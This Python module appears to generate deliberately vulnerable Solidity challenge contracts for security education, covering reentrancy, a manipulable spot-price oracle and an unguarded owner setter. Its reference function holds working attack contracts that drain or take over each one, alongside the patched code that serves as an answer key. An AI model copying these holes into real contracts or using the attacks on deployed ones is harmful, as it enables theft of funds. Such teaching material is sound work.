"""Original, deliberately vulnerable educational fixtures. Never deploy publicly."""

from dataclasses import dataclass, asdict
import hashlib
import random
import secrets

NAMES = ("Reentrant reserve", "Spot-price credit", "Unprotected treasury")
SOURCES = (
    "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/BurgerSwap_exp.sol",
    "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/PancakeBunny_exp.sol",
    "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-08/PolyNetwork_exp.sol",
)
HEADER = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\n"


@dataclass
class Challenge:
    challengeId: str
    seed: int
    vulnClass: int
    difficulty: int
    title: str
    source: str
    code: str
    fingerprint: str
    parameter: int

    def public(self):
        return asdict(self)


def generate(vuln_class: int, seed: int | None = None) -> Challenge:
    if vuln_class not in range(3):
        raise ValueError("Unknown vulnerability class")
    seed = secrets.randbits(128) if seed is None else seed
    rng = random.Random(seed)
    parameter = rng.randrange(11, 999)
    balance = "ledger_" + hashlib.sha256(str(seed).encode()).hexdigest()[:10]
    tag = int.from_bytes(hashlib.sha256(str(seed).encode()).digest()[:16])
    if vuln_class == 0:
        body = f"""mapping(address => uint256) public {balance};
    function deposit() external payable {{ {balance}[msg.sender] += msg.value; }}
    function credit(address a) external view returns (uint256) {{ return {balance}[a]; }}
    function withdraw() external {{
        uint256 amount = {balance}[msg.sender];
        require(amount > 0, "empty");
        (bool ok,) = msg.sender.call{{value: amount}}("");
        require(ok, "send");
        {balance}[msg.sender] = 0;
    }}"""
    elif vuln_class == 1:
        body = f"""address public owner;
    uint256 public spot = {parameter};
    uint256 public trusted = {parameter};
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;
    constructor() {{ owner = msg.sender; }}
    function deposit() external payable {{ collateral[msg.sender] += msg.value; }}
    // Educational market adapter: anyone can move the manipulable spot quote.
    function moveSpot(uint256 next) external {{ require(next > 0, "zero"); spot = next; }}
    function setTrusted(uint256 next) external {{ require(msg.sender == owner && next > 0, "owner"); trusted = next; }}
    function borrow(uint256 amount) external {{
        require(debt[msg.sender] + amount <= collateral[msg.sender] * spot / {parameter} / 2, "limit");
        debt[msg.sender] += amount;
        (bool ok,) = msg.sender.call{{value: amount}}("");
        require(ok, "send");
    }}"""
    else:
        body = """address public owner;
    constructor() { owner = msg.sender; }
    function setOwner(address next) external {
        require(next != address(0), "zero");
        owner = next;
    }
    function sweep(address payable to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        (bool ok,) = to.call{value: amount}("");
        require(ok, "send");
    }"""
    # Seed-derived storage name/constant and shuffled function order; not an AST novelty claim.
    code = (
        HEADER
        + f"contract Challenge {{\n    uint256 public constant VARIANT = {tag};\n    {body}\n    receive() external payable {{}}\n}}\n"
    )
    fingerprint = hashlib.sha256(code.encode()).hexdigest()
    return Challenge(
        f"ax-{vuln_class}-{fingerprint[:20]}",
        seed,
        vuln_class,
        1 if vuln_class == 1 else 0,
        NAMES[vuln_class],
        SOURCES[vuln_class],
        code,
        fingerprint,
        parameter,
    )


def reference(c: Challenge) -> tuple[str, str]:
    """Trusted fixtures for calibration/tests only; never served by the API."""
    patch = c.code
    if c.vulnClass == 0:
        import re

        name = re.search(r"public (ledger_\w+)", patch)[1]
        patch = patch.replace(
            "        (bool ok,)", f"        {name}[msg.sender] = 0;\n        (bool ok,)"
        )
        patch = patch.replace(
            f'        require(ok, "send");\n        {name}[msg.sender] = 0;',
            '        require(ok, "send");',
        )
        attack = """interface I { function deposit() external payable; function withdraw() external; }
contract Attack {
    I target; uint256 unit;
    function run(address t) external payable { target = I(t); unit = msg.value; target.deposit{value: unit}(); target.withdraw(); }
    receive() external payable { if(address(target).balance >= unit) { (bool ok,) = address(target).call(abi.encodeWithSignature("withdraw()")); ok; } }
}"""
    elif c.vulnClass == 1:
        patch = patch.replace(
            "collateral[msg.sender] * spot", "collateral[msg.sender] * trusted"
        )
        attack = f"""interface I {{ function deposit() external payable; function moveSpot(uint256) external; function borrow(uint256) external; }}
contract Attack {{
    function run(address t) external payable {{ I(t).deposit{{value:msg.value}}(); I(t).moveSpot({c.parameter} * 100); I(t).borrow(msg.value * 5); }}
    receive() external payable {{}}
}}"""
    else:
        patch = patch.replace(
            "function setOwner(address next) external {",
            'function setOwner(address next) external {\n        require(msg.sender == owner, "owner");',
        )
        attack = """interface I { function setOwner(address) external; function sweep(address payable,uint256) external; }
contract Attack {
    function run(address t) external payable { I(t).setOwner(address(this)); I(t).sweep(payable(address(this)), t.balance); }
    receive() external payable {}
}"""
    return patch, HEADER + attack
